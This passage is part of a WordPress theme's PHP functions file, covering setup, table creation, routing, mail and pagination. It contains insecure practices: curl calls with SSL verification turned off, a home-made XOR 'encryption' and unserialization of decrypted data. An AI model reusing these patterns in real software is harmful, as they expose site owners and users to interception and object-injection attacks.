    $new_comment_text = preg_replace('/\[em_([0-9]+)\]/i', '<img class="em" src="'.$emotion_basepath.'$1'.'.gif">', $comment_text);

    return wpautop($new_comment_text);
}
add_filter('comment_text', 'tt_convert_comment_emotions', 10, 2);
add_filter('get_comment_text', 'tt_convert_comment_emotions', 10, 2);
function tt_setup()
{
    add_theme_support('automatic-feed-links');
    add_theme_support('post-thumbnails');
    add_theme_support('post-formats', array('audio', 'aside', 'chat', 'gallery', 'image', 'link', 'quote', 'status', 'video'));
    $menus = array(
        'header-menu' => __('Top Menu', 'tt'),
        'footer-menu' => __('Foot Menu', 'tt'),
    );
    if (TT_PRO && tt_get_option('tt_enable_shop', false)) {
        $menus['shop-menu'] =  '右侧快速导航';
    }
    register_nav_menus($menus);

    function tt_register_required_plugins()
    {
        $plugins = array(
            // 浏览数统计
            array(
                'name' => 'WP-PostViews',
                'slug' => 'wp-postviews',
                'source' => 'https://downloads.wordpress.org/plugin/wp-postviews.1.75.zip',
                'required' => true,
                'version' => '1.73',
                'force_activation' => true,
                'force_deactivation' => false,
            ),

            
        );
        $config = array(
            'domain' => 'tt',         	// Text domain - likely want to be the same as your theme.
            'default_path' => THEME_DIR.'/dash/plugins',                         	// Default absolute path to pre-packaged plugins
            //'parent_menu_slug' 	=> 'themes.php', 				// Default parent menu slug(deprecated)
            //'parent_url_slug' 	=> 'themes.php', 				// Default parent URL slug(deprecated)
            'menu' => 'install-required-plugins', 	// Menu slug
            'has_notices' => true,                       	// Show admin notices or not
            'is_automatic' => false,					   	// Automatically activate plugins after installation or not
            'message' => '',							// Message to output right before the plugins table
            'strings' => array(
                'page_title' => __('Install Required Plugins', 'tt'),
                'menu_title' => __('Install Plugins', 'tt'),
                'installing' => __('Installing: %s', 'tt'), // %1$s = plugin name
                'oops' => __('There is a problem with the plugin API', 'tt'),
                'notice_can_install_required' => _n_noop('Tint require the plugin: %1$s.', 'Tint require these plugins: %1$s.', 'tt'), // %1$s = plugin name(s)
                'notice_can_install_recommended' => _n_noop('Tint recommend the plugin: %1$s.', 'Tint recommend these plugins: %1$s.', 'tt'), // %1$s = plugin name(s)
                'notice_cannot_install' => _n_noop('Permission denied while installing %s plugin.', 'Permission denied while installing %s plugins.', 'tt'),
                'notice_can_activate_required' => _n_noop('The required plugin are not activated yet: %1$s', 'These required plugins are not activated yet: %1$s', 'tt'),
                'notice_can_activate_recommended' => _n_noop('The recommended plugin are not activated yet: %1$s', 'These recommended plugins are not activated yet: %1$s', 'tt'),
                'notice_cannot_activate' => _n_noop('Permission denied while activating the %s plugin.', 'Permission denied while activating the %s plugins.', 'tt'),
                'notice_ask_to_update' => _n_noop('The plugin need update: %1$s.', 'These plugins need update: %1$s.', 'tt'), // %1$s = plugin name(s)
                'notice_cannot_update' => _n_noop('Permission denied while updating the %s plugin.', 'Permission denied while updating %s plugins.', 'tt'),
                'install_link' => _n_noop('Install the plugin', 'Install the plugins', 'tt'),
                'activate_link' => _n_noop('Activate the installed plugin', 'Activate the installed plugins', 'tt'),
                'return' => __('return back', 'tt'),
                'plugin_activated' => __('Plugin activated', 'tt'),
                'complete' => __('All plugins are installed and activated %s', 'tt'), // %1$s = dashboard link
                'nag_type' => 'updated', // Determines admin notice type - can only be 'updated' or 'error'
            ),
        );
        tgmpa($plugins, $config);
    }
    add_action('tgmpa_register', 'tt_register_required_plugins');
}
add_action('after_setup_theme', 'tt_setup');
function tt_add_avatar_folder()
{
    $upload_dir = WP_CONTENT_DIR.'/uploads';
    $avatar_dir = WP_CONTENT_DIR.'/uploads/avatars';
    if (!is_dir($avatar_dir)) {
        // TODO: safe mkdir and echo possible error info on DEBUG mode(option)
        try {
            mkdir($upload_dir, 0755);
            mkdir($avatar_dir, 0755);
        } catch (Exception $e) {
            if (tt_get_option('tt_theme_debug', false)) {
                $message = __('Create avatar upload folder failed, maybe check your php.ini to enable `mkdir` function.\n', 'tt').__('Caught exception: ', 'tt').$e->getMessage().'\n';
                $title = __('WordPress internal error', 'tt');
                wp_die($message, $title);
            }
        }
    }
}
add_action('load-themes.php', 'tt_add_avatar_folder');
function tt_add_upload_tmp_folder()
{
    $tmp_dir = WP_CONTENT_DIR.'/uploads/tmp';
    if (!is_dir($tmp_dir)) {
        try {
            mkdir($tmp_dir, 0755);
        } catch (Exception $e) {
            if (tt_get_option('tt_theme_debug', false)) {
                $message = __('Create tmp upload folder failed, maybe check your php.ini to enable `mkdir` function.\n', 'tt').__('Caught exception: ', 'tt').$e->getMessage().'\n';
                $title = __('WordPress internal error', 'tt');
                wp_die($message, $title);
            }
        }
    }
}
add_action('load-themes.php', 'tt_add_upload_tmp_folder');

function tt_copy_object_cache_plugin()
{
    //TODO: maybe need check the file in wp-content is same with that in theme dir
    $object_cache_type = tt_get_option('tt_object_cache', 'none');
    if ($object_cache_type == 'memcache' && !class_exists('Memcache')) {
        wp_die(__('You choose the memcache object cache, but the Memcache library is not installed', 'tt'), __('Copy plugin error', 'tt'));
    }
    if ($object_cache_type == 'redis' && !class_exists('Redis')) {
        wp_die(__('You choose the redis object cache, but the Redis library is not installed', 'tt'), __('Copy plugin error', 'tt'));
    }
    //!file_exists( WP_CONTENT_DIR . '/object-cache.php' ) ??
    $last_use_cache_type = get_option('tt_object_cache_type');
    if (in_array($object_cache_type, array('memcache', 'redis')) && $last_use_cache_type != $object_cache_type && file_exists(THEME_DIR.'/dash/plugins/'.$object_cache_type.'/object-cache.php')) {
        try {
            copy(THEME_DIR.'/dash/plugins/'.$object_cache_type.'/object-cache.php', WP_CONTENT_DIR.'/object-cache.php');
            update_option('tt_object_cache_type', $object_cache_type);
        } catch (Exception $e) {
            if (tt_get_option('tt_theme_debug', false)) {
                $message = __('Can not copy `object-cache.php` to `wp-content` dir.\n', 'tt').__('Caught exception: ', 'tt').$e->getMessage().'\n';
                $title = __('Copy plugin error', 'tt');
                wp_die($message, $title);
            }
        }
    }
}
//add_action('load-themes.php', 'tt_copy_object_cache_plugin');
add_action('admin_menu', 'tt_copy_object_cache_plugin');

function tt_copy_timthumb_cache_base()
{
    $cache_dir = WP_CONTENT_DIR.'/cache';
    if (!is_dir($cache_dir)) {
        try {
            mkdir($cache_dir, 0755);
            mkdir($cache_dir.'/timthumb', 0755);
        } catch (Exception $e) {
            if (tt_get_option('tt_theme_debug', false)) {
                $message = __('Create timthumb cache folder failed, maybe check your php.ini to enable `mkdir` function.\n', 'tt').__('Caught exception: ', 'tt').$e->getMessage().'\n';
                $title = __('Create folder error', 'tt');
                wp_die($message, $title);
            }
        }
    }

    if (is_dir($cache_dir)) {
        try {
            copy(THEME_DIR.'/dash/plugins/timthumb/index.html', WP_CONTENT_DIR.'/cache/timthumb/index.html');
            copy(THEME_DIR.'/dash/plugins/timthumb/timthumb_cacheLastCleanTime.touch', WP_CONTENT_DIR.'/cache/timthumb/timthumb_cacheLastCleanTime.touch');
        } catch (Exception $e) {
            if (tt_get_option('tt_theme_debug', false)) {
                $message = __('Can not copy `memcache object-cache.php` to `wp-content` dir.\n', 'tt').__('Caught exception: ', 'tt').$e->getMessage().'\n';
                $title = __('WordPress internal error', 'tt');
                wp_die($message, $title);
            }
        }
    }
}
add_action('load-themes.php', 'tt_copy_timthumb_cache_base');

function tt_reset_image_size()
{
    $enable = of_get_option('tt_enable_wp_crop', false);
    update_option('thumbnail_size_w', $enable ? 225 : 0);
    update_option('thumbnail_size_h', $enable ? 150 : 0);
    update_option('thumbnail_crop', 1);
    update_option('medium_size_w', $enable ? 375 : 0);
    update_option('medium_size_h', $enable ? 250 : 0);
    update_option('large_size_w', $enable ? 960 : 0);
    update_option('large_size_h', $enable ? 640 : 0);
    update_option( 'medium_large_size_w', $enable ? 768 : 0 );
}
add_action('load-themes.php', 'tt_reset_image_size');
function tt_install_follow_table()
{
    global $wpdb;
    include_once ABSPATH.'/wp-admin/includes/upgrade.php';
    $table_charset = '';
    $prefix = $wpdb->prefix;
    $table = $prefix.'tt_follow';
    if ($wpdb->has_cap('collation')) {
        if (!empty($wpdb->charset)) {
            $table_charset = "DEFAULT CHARACTER SET $wpdb->charset";
        }
        if (!empty($wpdb->collate)) {
            $table_charset .= " COLLATE $wpdb->collate";
        }
    }
    $sql = "CREATE TABLE $table (
        `id` int NOT NULL AUTO_INCREMENT,
        PRIMARY KEY(id),
        INDEX uid_index(user_id),
        INDEX fuid_index(follow_user_id),
        `user_id` int,
        `follow_user_id` int,
        `follow_status` int,
        `follow_time` datetime
    ) ENGINE = MyISAM CHARSET=$table_charset;";
    maybe_create_table($table, $sql);
}
add_action('load-themes.php', 'tt_install_follow_table');
function tt_install_sina_img_table()
{
    global $wpdb;
    include_once ABSPATH.'/wp-admin/includes/upgrade.php';
    $table_charset = '';
    $prefix = $wpdb->prefix;
    $table = $prefix.'tt_weibo_image';
    $sql = "CREATE TABLE IF NOT EXISTS $table(
            `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
            `post_id` bigint(20) unsigned NOT NULL DEFAULT 0,
            `src` VARCHAR(255) NOT NULL DEFAULT '',
            `pid` VARCHAR (50) NOT NULL DEFAULT '',
            `create_time` timestamp NOT NULL DEFAULT NOW(),
            PRIMARY KEY (`id`),
            UNIQUE KEY uniq_post_id_src(`post_id`,`src`)
           ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1";
    maybe_create_table($table, $sql);
}
add_action('load-themes.php', 'tt_install_sina_img_table');
function tt_install_message_table()
{
    global $wpdb;
    include_once ABSPATH.'/wp-admin/includes/upgrade.php';
    $table_charset = '';
    $prefix = $wpdb->prefix;
    $table = $prefix.'tt_messages';
    if ($wpdb->has_cap('collation')) {
        if (!empty($wpdb->charset)) {
            $table_charset = "DEFAULT CHARACTER SET $wpdb->charset";
        }
        if (!empty($wpdb->collate)) {
            $table_charset .= " COLLATE $wpdb->collate";
        }
    }
    $sql = "CREATE TABLE $table (
        `msg_id` int NOT NULL AUTO_INCREMENT,
        PRIMARY KEY(msg_id),
        INDEX uid_index(user_id),
        INDEX sid_index(sender_id),
        INDEX mtype_index(msg_type),
        INDEX mdate_index(msg_date),
        INDEX mstatus_index(msg_read),
        `user_id` int,
        `sender_id` int,
        `sender`  varchar(50),
        `msg_type` varchar(20),
        `msg_date` datetime,
        `msg_title` text,
        `msg_content` text,
        `msg_read`  boolean DEFAULT 0,
        `msg_status`  varchar(20)
    ) ENGINE = MyISAM CHARSET=$table_charset;";
    maybe_create_table($table, $sql);
}
add_action('load-themes.php', 'tt_install_message_table');

function tt_install_membership_table()
{
    global $wpdb;
    include_once ABSPATH.'/wp-admin/includes/upgrade.php';
    $table_charset = '';
    $prefix = $wpdb->prefix;
    $users_table = $prefix.'tt_members';
    if ($wpdb->has_cap('collation')) {
        if (!empty($wpdb->charset)) {
            $table_charset = "DEFAULT CHARACTER SET $wpdb->charset";
        }
        if (!empty($wpdb->collate)) {
            $table_charset .= " COLLATE $wpdb->collate";
        }
    }
    $create_vip_users_sql = "CREATE TABLE $users_table (id int(11) NOT NULL auto_increment,user_id int(11) NOT NULL,user_type tinyint(4) NOT NULL default 0,startTime datetime NOT NULL default '0000-00-00 00:00:00',endTime datetime NOT NULL default '0000-00-00 00:00:00',endTimeStamp int NOT NULL default 0,PRIMARY KEY (id),INDEX uid_index(user_id),INDEX utype_index(user_type),INDEX endTime_index(user_id)) ENGINE = MyISAM $table_charset;";
    maybe_create_table($users_table, $create_vip_users_sql);
}
add_action('load-themes.php', 'tt_install_membership_table');
//add_action('admin_menu', 'tt_install_membership_table');
function tt_install_card_table()
{
    global $wpdb;
    include_once ABSPATH.'/wp-admin/includes/upgrade.php';
    $table_charset = '';
    $prefix = $wpdb->prefix;
    $cards_table = $prefix.'tt_cards';
    if ($wpdb->has_cap('collation')) {
        if (!empty($wpdb->charset)) {
            $table_charset = "DEFAULT CHARACTER SET $wpdb->charset";
        }
        if (!empty($wpdb->collate)) {
            $table_charset .= " COLLATE $wpdb->collate";
        }
    }
    $create_cards_sql = "CREATE TABLE $cards_table (
        id int(11) NOT NULL auto_increment,
        denomination int NOT NULL DEFAULT 100,
        card_id VARCHAR(20) NOT NULL,
        card_secret VARCHAR(20) NOT NULL,
        create_time datetime NOT NULL default '0000-00-00 00:00:00',
        status SMALLINT NOT NULL DEFAULT 1,
        PRIMARY KEY (id),
        INDEX status_index(status),
        INDEX denomination_index(denomination)) ENGINE = MyISAM $table_charset;";
    maybe_create_table($cards_table, $create_cards_sql);
}
add_action('load-themes.php', 'tt_install_card_table');
function tt_get_option($name, $default = '')
{
    return of_get_option($name, $default);
}
function tt_url_for($key, $arg = null, $relative = false)
{
    $routes = (array) json_decode(SITE_ROUTES);
    if (array_key_exists($key, $routes)) {
        return $relative ? '/'.$routes[$key] : home_url('/'.$routes[$key]);
    }

    // 输入参数$arg为user时获取其ID使用
    $get_uid = function ($var) {
        if ($var instanceof WP_User) {
            return $var->ID;
        } else {
            return intval($var);
        }
    };

    $endpoint = null;
    switch ($key) {
        case 'my_order':
            $endpoint = 'me/order/'.(int) $arg;
            break;
        case 'uc_comments':
            $endpoint = 'u/'.call_user_func($get_uid, $arg).'/comments';
            break;
        case 'uc_profile':
            $endpoint = 'u/'.call_user_func($get_uid, $arg);
            break;
        case 'uc_me':
            $endpoint = 'u/'.get_current_user_id();
            break;
        case 'uc_latest':
            $endpoint = 'u/'.call_user_func($get_uid, $arg).'/latest';
            break;
        case 'uc_stars':
            $endpoint = 'u/'.call_user_func($get_uid, $arg).'/stars';
            break;
        case 'uc_followers':
            $endpoint = 'u/'.call_user_func($get_uid, $arg).'/followers';
            break;
        case 'uc_following':
            $endpoint = 'u/'.call_user_func($get_uid, $arg).'/following';
            break;
        case 'uc_activities':
            $endpoint = 'u/'.call_user_func($get_uid, $arg).'/activities';
            break;
        case 'uc_chat':
            $endpoint = 'u/'.call_user_func($get_uid, $arg).'/chat';
            break;
        case 'manage_user':
            $endpoint = 'management/users/'.intval($arg);
            break;
        case 'manage_order':
            $endpoint = 'management/orders/'.intval($arg);
            break;
        case 'shop_archive':
            $endpoint = tt_get_option('tt_product_archives_slug', 'shop');
            break;
        case 'edit_post':
            $endpoint = 'me/editpost/'.absint($arg);
            break;
        case 'download':
            $endpoint = 'site/download?_='.urlencode(rtrim(tt_encrypt($arg, tt_get_option('tt_private_token')), '='));
            break;
    }
    if ($endpoint) {
        return $relative ? '/'.$endpoint : home_url('/'.$endpoint);
    }

    return false;
}
function tt_get_current_url($method = 'php')
{
    if ($method === 'wp') {
        return Utils::getCurrentUrl();
    }

    return Utils::getPHPCurrentUrl();
}

function tt_signin_url($redirect)
{
    return tt_filter_default_login_url('', $redirect);
}

function tt_signup_url($redirect)
{
    $signup_url = tt_url_for('signup');

    if (!empty($redirect)) {
        $signup_url = add_query_arg('redirect_to', urlencode($redirect), $signup_url);
    }

    return $signup_url;
}
function tt_signout_url($redirect = '')
{
    if (empty($redirect)) {
        $redirect = home_url();
    }

    return tt_filter_default_logout_url('', $redirect);
}
function tt_add_redirect($url, $redirect = '')
{
    if ($redirect) {
        return add_query_arg('redirect_to', urlencode($redirect), $url);
    } elseif (isset($_GET['redirect_to'])) {
        return add_query_arg('redirect_to', urlencode(esc_url_raw($_GET['redirect_to'])), $url);
    } elseif (isset($_GET['redirect'])) {
        return add_query_arg('redirect_to', urlencode(esc_url_raw($_GET['redirect'])), $url);
    }

    return add_query_arg('redirect_to', urlencode(home_url()), $url);
}
function tt_encrypt($data, $key)
{
    if (is_numeric($data)) {
        $data = strval($data);
    } else {
        $data = maybe_serialize($data);
    }
    $key = md5($key);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = $str = '';
    for ($i = 0; $i < $len; ++$i) {
        if ($x == $l) {
            $x = 0;
        }
        $char .= $key[$x];
        ++$x;
    }
    for ($i = 0; $i < $len; ++$i) {
        $str .= chr(ord($data[$i]) + (ord($char[$i])) % 256);
    }

    return base64_encode($str);
}
function tt_decrypt($data, $key)
{
    $key = md5($key);
    $x = 0;
    $data = base64_decode($data);
    $len = strlen($data);
    $l = strlen($key);
    $char = $str = '';
    for ($i = 0; $i < $len; ++$i) {
        if ($x == $l) {
            $x = 0;
        }
        $char .= substr($key, $x, 1);
        ++$x;
    }
    for ($i = 0; $i < $len; ++$i) {
        if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }

    return maybe_unserialize($str);
}
function tt_authdata($data, $operation = 'DECODE', $key = '', $expire = 0)
{
    if ($operation != 'DECODE') {
        $data = maybe_serialize($data);
    }
    $ckey_length = 4;
    $key = md5($key ? $key : 'null');
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($data, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';
    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey);
    $data = $operation == 'DECODE' ? base64_decode(substr($data, $ckey_length)) : sprintf('%010d', $expire ? $expire + time() : 0).substr(md5($data.$keyb), 0, 16).$data;
    $string_length = strlen($data);
    $result = '';
    $box = range(0, 255);
    $rndkey = array();
    for ($i = 0; $i <= 255; ++$i) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }
    for ($j = $i = 0; $i < 256; ++$i) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
    for ($a = $j = $i = 0; $i < $string_length; ++$i) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($data[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
    if ($operation == 'DECODE') {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return maybe_unserialize(substr($result, 26));
        } else {
            return false;
        }
    } else {
        return $keyc.str_replace('=', '', base64_encode($result));
    }
}
function tt_wp_die_handler($message, $title = '', $args = array())
{
    $defaults = array('response' => 403);
    $r = wp_parse_args($args, $defaults);

    if (function_exists('is_wp_error') && is_wp_error($message)) {
        if (empty($title)) {
            $error_data = $message->get_error_data();
            if (is_array($error_data) && isset($error_data['title'])) {
                $title = $error_data['title'];
            }
        }
        $errors = $message->get_error_messages();
        switch (count($errors)) {
            case 0:
                $message = '';
                break;
            case 1:
                $message = "{$errors[0]}";
                break;
            default:
                $message = "<ul>\n\t\t<li>".join("</li>\n\t\t<li>", $errors)."</li>\n\t</ul>";
                break;
        }
    }

    if (!did_action('admin_head')) :
        if (!headers_sent()) {
            status_header($r['response']);
            nocache_headers();
            header('Content-Type: text/html; charset=utf-8');
        }

    if (empty($title)) {
        $title = __('WordPress &rsaquo; Error');
    }

    $text_direction = 'ltr';
    if (isset($r['text_direction']) && 'rtl' == $r['text_direction']) {
        $text_direction = 'rtl';
    } elseif (function_exists('is_rtl') && is_rtl()) {
        $text_direction = 'rtl';
    }

    // 引入自定义模板
    global $wp_query;
    $wp_query->query_vars['die_title'] = $title;
    $wp_query->query_vars['die_msg'] = $message;
    include_once THEME_TPL.'/tpl.Error.php';
    endif;

    die();
}
function tt_wp_die_handler_switch()
{
    return 'tt_wp_die_handler';
}
add_filter('wp_die_handler', 'tt_wp_die_handler_switch');
function tt_get_css($filename = '')
{
    if ($filename) {
        return THEME_CDN_ASSET.'/css/'.$filename;
    }

    $post_type = get_post_type();

    if (is_home()) {
        $filename = CSS_HOME;
    } elseif (is_single()) {
        if ($post_type === 'thread') {
            $filename = CSS_THREAD;
        } else if ($post_type === 'product') {
            $filename = CSS_PRODUCT;
        } else if ($post_type === 'bulletin') {
            $filename = CSS_PAGE;
        } else {
            $filename = CSS_SINGLE;
        }
    } elseif($post_type == 'thread' || get_query_var('is_thread_route')) {
        $filename = CSS_THREAD;
    } elseif ((is_archive() && !is_author()) || (is_search() && isset($_GET['in_shop']) && $_GET['in_shop'] == 1)) {
        $filename = get_post_type() === 'product' || (is_search() && isset($_GET['in_shop']) && $_GET['in_shop'] == 1) ? CSS_PRODUCT_ARCHIVE : CSS_ARCHIVE;
    } elseif (is_author()) {
        $filename = CSS_UC;
    } elseif (is_404()) {
        $filename = CSS_404;
    } elseif (get_query_var('is_me_route')) {
        $filename = CSS_ME;
    } elseif (get_query_var('action')) {
        $filename = CSS_ACTION;
    } elseif (is_front_page()) {
        $filename = CSS_FRONT_PAGE;
    } elseif (get_query_var('site_util')) {
        $filename = CSS_SITE_UTILS;
    } elseif (get_query_var('oauth')) {
        $filename = CSS_OAUTH;
    } elseif (get_query_var('is_manage_route')) {
        $filename = CSS_MANAGE;
    } else {
        // is_page() ?
        $filename = CSS_PAGE;
    }

    return THEME_CDN_ASSET.'/css/'.$filename;
}

function tt_get_custom_css()
{
    $ver = tt_get_option('tt_custom_css_cache_suffix');

    return add_query_arg('ver', $ver, tt_url_for('custom_css'));
}
function tt_conditional_class($base_class, $condition, $active_class = 'active')
{
    if ($condition) {
        return $base_class.' '.$active_class;
    }

    return $base_class;
}
function tt_qrcode($text, $size)
{
    //TODO size
    return tt_url_for('qr').'?text='.$text;
}
function tt_copyright_year()
{
    $now_year = date('Y');
    $open_date = tt_get_option('tt_site_open_date', $now_year);
    $open_year = substr($open_date, 0, 4);

    return $open_year.'-'.$now_year.'&nbsp;&nbsp;';
}

function tt_get_referral_link($user_id = 0, $base_link = '')
{
    if (!$base_link) {
        $base_link = home_url();
    }
    if (!$user_id) {
        $user_id = get_current_user_id();
    }

    return add_query_arg(array('ref' => $user_id), $base_link);
}

function tt_get_http_response_code($theURL)
{
    @$headers = get_headers($theURL);

    return substr($headers[0], 9, 3);
}

function tt_curl_get($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_URL, $url);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

function tt_curl_post($url, $data)
{
    $post_data = http_build_query($data);
    $post_url = $url;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $post_url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $return = curl_exec($ch);
    if (curl_errno($ch)) {
        return '';
    }
    curl_close($ch);

    return $return;
}

function tt_filter_of_multicheck_option($option)
{
    // 主题选项框架获得multicheck类型选项的值为 array(id => bool), 而我们需要的是bool为true的array(id)
    if (!is_array($option)) {
        return $option;
    }

    $new_option = array();
    foreach ($option as $key => $value) {
        if ($value) {
            $new_option[] = $key;
        }
    }

    return $new_option;
}

function tt_default_pagination($base, $current, $max)
{
    ?>
    <nav aria-label="Page navigation">
        <ul class="pagination">
            <?php $pagination = paginate_links(array(
                'base' => $base,
                'format' => '?paged=%#%',
                'current' => $current,
                'total' => $max,
                'type' => 'array',
                'prev_next' => true,
                'prev_text' => '<i class="tico tico-angle-left"></i>',
                'next_text' => '<i class="tico tico-angle-right"></i>',
            )); ?>
            <?php foreach ($pagination as $page_item) {
                echo '<li class="page-item">'.$page_item.'</li>';
            } ?>
        </ul>
        <div class="page-nums">
            <span class="current-page"><?php printf(__('Current Page %d', 'tt'), $current); ?></span>
            <span class="separator">/</span>
            <span class="max-page"><?php printf(__('Total %d Pages', 'tt'), $max); ?></span>
        </div>
    </nav>
    <?php
}

function tt_pagination($base, $current, $max)
{
    ?>
    <nav class="pagination-new">
        <ul>
            <?php $pagination = paginate_links(array(
                'base' => $base,
                'format' => '?paged=%#%',
                'current' => $current,
                'total' => $max,
                'type' => 'array',
                'prev_next' => true,
                'prev_text' => '<span class="prev">'.__('PREV PAGE', 'tt').'</span>',
                'next_text' => '<span class="next">'.__('NEXT PAGE', 'tt').'</span>',
            )); ?>
            <?php foreach ($pagination as $page_item) {
                   $page_item = str_replace('_1.html', '.html',$page_item);
                   $page_item = str_replace("'", '"',$page_item);
                   $page_item = str_replace('/page/1"', '"',$page_item);
                  echo '<li class="page-item">'.$page_item.'</li>';
            } ?>
            <li class="page-item"><span class="max-page"><?php printf(__('Total %d Pages', 'tt'), $max); ?></span></li>
        </ul>
    </nav>
    <?php
}

function tt_get_pagination_count($posts)
{
    $counts = substr_count($posts[0]->post_content, '<!--nextpage-->');
    $count = $counts + 1;

    return $count;
}

function tt_switch_mailer($phpmailer)
{
    $mailer = tt_get_option('tt_default_mailer');
    if ($mailer === 'smtp') {
        //$phpmailer->isSMTP();
        $phpmailer->Mailer = 'smtp';
        $phpmailer->Host = tt_get_option('tt_smtp_host');
        $phpmailer->SMTPAuth = true; // Force it to use Username and Password to authenticate
        $phpmailer->Port = tt_get_option('tt_smtp_port');
        $phpmailer->Username = tt_get_option('tt_smtp_username');
        $phpmailer->Password = tt_get_option('tt_smtp_password');

        // Additional settings…
        $phpmailer->SMTPSecure = tt_get_option('tt_smtp_secure');
        $phpmailer->FromName = tt_get_option('tt_smtp_name');
        $phpmailer->From = $phpmailer->Username; // tt_get_option('tt_mail_custom_address'); // 多数SMTP提供商要求发信人与SMTP服务器匹配，自定义发件人地址可能无效
        $phpmailer->Sender = $phpmailer->From; //Return-Path
        $phpmailer->AddReplyTo($phpmailer->From, $phpmailer->FromName); //Reply-To
    } else {
        // when use php mail
        $phpmailer->FromName = tt_get_option('tt_mail_custom_sender');
        $phpmailer->From = tt_get_option('tt_mail_custom_address');
    }
}
add_action('phpmailer_init', 'tt_switch_mailer');

function tt_mail($from, $to, $title = '', $args = array(), $template = 'comment')
{
    $title = $title ? trim($title) : tt_get_mail_title($template);
    $content = tt_mail_render($args, $template);
    $blog_name = get_bloginfo('name');
    $sender_name = tt_get_option('tt_mail_custom_sender') || tt_get_option('tt_smtp_name', $blog_name);
    if (empty($from)) {
        $from = tt_get_option('tt_mail_custom_address', 'no-reply@'.preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME']))); //TODO: case e.g subdomain.domain.com
    }

    $fr = 'From: "'.$sender_name."\" <$from>";
    $headers = "$fr\nContent-Type: text/html; charset=".get_option('blog_charset')."\n";
    wp_mail($to, $title, $content, $headers);
}
add_action('tt_async_send_mail', 'tt_mail', 10, 5);

function tt_async_mail($from, $to, $title = '', $args = array(), $template = 'comment'){
    if(!current_user_can('edit_users')) {
            return tt_mail($from, $to, $title, $args, $template);
    }
    if(is_array($args)) {
        $args = base64_encode(json_encode($args));
    }
    do_action('send_mail', $from, $to, $title, $args, $template);
}

function tt_mail_render($content, $template = 'comment')
{
    // 使用Plates模板渲染引擎
    $templates = new League\Plates\Engine(THEME_TPL.'/plates/emails');
    if (is_string($content)) {
        return $templates->render('pure', array('content' => $content));
    } elseif (is_array($content)) {
        return $templates->render($template, $content); // TODO confirm template exist
    }

    return '';
}

function tt_get_mail_title($template = 'comment')
{
    $blog_name = get_bloginfo('name');
    switch ($template) {
        case 'comment':
            return sprintf(__('New Comment Notification - %s', 'tt'), $blog_name);
            break;
        case 'comment-admin':
            return sprintf(__('New Comment In Your Blog - %s', 'tt'), $blog_name);
            break;
        case 'contribute-post':
            return sprintf(__('New Comment Reply Notification - %s', 'tt'), $blog_name);
            break;
        case 'download':
            return sprintf(__('The Files You Asking For In %s', 'tt'), $blog_name);
            break;
        case 'download-admin':
            return sprintf(__('New Download Request Handled In Your Blog %s', 'tt'), $blog_name);
            break;
        case 'findpass':
            return sprintf(__('New Comment Reply Notification - %s', 'tt'), $blog_name);
            break;
        case 'login':
            return sprintf(__('New Login Event Notification - %s', 'tt'), $blog_name);
            break;
        case 'login-fail':
            return sprintf(__('New Login Fail Event Notification - %s', 'tt'), $blog_name);
            break;
        case 'reply':
            return sprintf(__('New Comment Reply Notification - %s', 'tt'), $blog_name);
            break;
        //TODO more
        default:
            return sprintf(__('Site Internal Notification - %s', 'tt'), $blog_name);
    }
}

function tt_comment_mail_notify($comment_id, $comment_object)
{
    if (!tt_get_option('tt_comment_events_notify', false) || $comment_object->comment_approved != 1 || !empty($comment_object->comment_type)) {
        return;
    }
    date_default_timezone_set('Asia/Shanghai');
    $admin_notify = '1'; // admin 要不要收回复通知 ( '1'=要 ; '0'=不要 )
    $admin_email = get_bloginfo('admin_email'); // $admin_email 可改为你指定的 e-mail.
    $comment = get_comment($comment_id);
    $comment_author = trim($comment->comment_author);
    $comment_date = trim($comment->comment_date);
    $comment_link = htmlspecialchars(get_comment_link($comment_id));
    $comment_content = nl2br($comment->comment_content);
    $comment_author_email = trim($comment->comment_author_email);
    $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
    $parent_comment = !empty($parent_id) ? get_comment($parent_id) : null;
    $parent_email = $parent_comment ? trim($parent_comment->comment_author_email) : '';
    $post = get_post($comment_object->comment_post_ID);
    $post_author_email = get_user_by('id', $post->post_author)->user_email;

//    global $wpdb;
//    if ($wpdb->query("Describe {$wpdb->comments} comment_mail_notify") == '')
//        $wpdb->query("ALTER TABLE {$wpdb->comments} ADD COLUMN comment_mail_notify TINYINT NOT NULL DEFAULT 0;");
//    if (isset($_POST['comment_mail_notify']))
//        $wpdb->query("UPDATE {$wpdb->comments} SET comment_mail_notify='1' WHERE comment_ID='$comment_id'");
    //$notify = $parent_id ? $parent_comment->comment_mail_notify : '0';
    $notify = 1; // 默认全部提醒
